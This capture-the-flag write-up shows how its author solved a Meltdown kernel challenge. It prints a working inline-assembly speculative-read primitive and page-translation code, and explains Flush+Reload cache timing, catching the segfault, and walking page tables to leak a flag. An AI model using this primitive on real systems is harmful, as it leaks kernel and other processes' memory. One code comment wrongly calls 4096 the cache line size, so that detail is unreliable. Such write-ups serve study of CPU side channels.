Meltdown & Page Table Walking: Because Ring-0 is Just a Suggestion

March 11, 2026 kernel, pwn, hardware Source Code

So, the kernel thinks it's safe. It sits up there in Ring 0, hoarding all the physical memory and hiding behind the MMU, thinking user-space processes are just peasants who can't see past their own virtual address space. Cute.

Enter Meltdown. For this challenge (molten_walk_challenge), we aren't just exploiting a simple buffer overflow. We are exploiting the CPU's own eagerness to please. Modern CPUs are impatient, they execute instructions ahead of time (speculative execution) just in case they need the results. If a permissions check fails, they throw the results away and pretend nothing happened. But they forget to clean up their footprints in the CPU cache.

Here is how I wrote a C exploit to peer into the kernel's soul, walk its page tables manually, and steal the flag.

1. The Shadow Realm (Speculative Execution)

Take a look at the core of the exploit—the inline assembly in speculative_exploit.

void speculative_exploit(size_t target_addr, char *com_buffer)
{
    asm volatile(
        ".intel_syntax noprefix\n"
        "xor rcx, rcx\n"
        "lea rbx,[%1]\n"
        "mov rax, 0x1337\n"
        "push rax\n"
        "fild QWORD PTR [rsp]\n"
        "fsqrt\n"             // Stall the CPU arithmetic unit
        "fistp QWORD PTR [rsp]\n"
        "pop rax\n"
        "mov rax, [rax]\n"    // SEGFAULT
        "mov cl, BYTE PTR [%0]\n"
        "shl rcx, 12\n"       // Multiply by 4096 (cache line size)
        "add rbx, rcx\n"
        "mov rbx, [rbx]\n"    // Cache the offset
        ".att_syntax prefix\n"
        :
        : "r" (target_addr), "r" (com_buffer)
        : "rcx", "rbx", "rax","rsp","memory"
    );
}

We want to read a kernel address. The moment we do mov rax, [rax] on an unauthorized address, the CPU triggers a Page Fault (SIGSEGV) and the kernel kills us. But speculatively, the CPU keeps executing the next few lines for a split second.

To widen this "speculative window", I fed the CPU a slow floating-point square root operation (fsqrt). While the CPU's arithmetic unit is sweating over the math, our speculative execution races ahead: it reads the secret byte, multiplies it by 4096, and touches our user-space com_buffer. By the time the CPU realizes we shouldn't have access and throws the Segfault, the damage is done. The secret byte has been encoded into the CPU cache. To survive the Segfault, I set up a signal handler that catches SIGSEGV and yeets us safely back to the main loop using longjmp.

2. Reading the Tea Leaves (Flush + Reload)

Before triggering the exploit, pre_work() flushes our entire probe buffer from the cache using _mm_clflush. After the speculative execution hits, post_work() steps in. It iterates through every page in the buffer and times how long it takes to read it using the __rdtsc() cycle counter. If a read takes less than ~200 cycles, it means it was in the cache!

3. Doing the MMU's Job For It

Having arbitrary read is great, but virtual memory is a maze. The challenge required reading a specific user-space buffer (0x404060), but from the kernel's physical perspective. To do this, I had to manually walk the 4-level x86 page tables, effectively doing the hardware Memory Management Unit's job in C.

long page_translation(long entry)
{
    long page = entry & ~0xfff;
    char arr[8] = {0};
    arr[7] = 0xff;
    arr[6] = 0xff;
    arr[5] = 0x88;
    arr[4] = 0x80;
    for(int i=0; i<4; i++) {
        arr[3-i] = page >> ((3-i)*8) & 0x000000ff;
    }
    return *(long *)arr;
}

First, I used an ioctl to leak the base address. Then, I read the task_struct to find the mm_struct (offset 992) and extracted the pgd (Page Global Directory) at offset 0x50. From there, I manually extracted the index for the PGD, PUD, PMD, and PTE, speculatively read the page table entries, and masked out the metadata flags to get the physical base address of the next table.

4. The Grand Finale

After crawling through four levels of page tables using purely speculative execution side-channels, we finally resolve the physical address of 0x404060. I added the 0x60 offset, pointed our Meltdown read primitive at it, and looped it 61 times to leak the flag string byte by byte.

Turns out, CPU optimizations are the ultimate security vulnerability.
